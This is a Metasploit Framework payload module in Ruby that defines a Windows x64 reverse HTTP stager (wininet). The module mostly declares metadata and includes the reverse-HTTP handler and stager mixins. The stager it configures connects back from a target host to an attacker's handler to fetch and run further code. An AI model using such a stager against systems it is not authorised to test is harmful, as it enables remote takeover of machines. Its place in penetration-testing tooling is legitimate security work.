##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/x64/reverse_http'

module MetasploitModule

  CachedSize = 528

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttp_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x64 Reverse HTTP Stager (wininet)',
      'Description' => 'Tunnel communication over HTTP (Windows x64 wininet)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockrdi http',
      'Stager'      => { 'Payload' => '' }))
  end
end
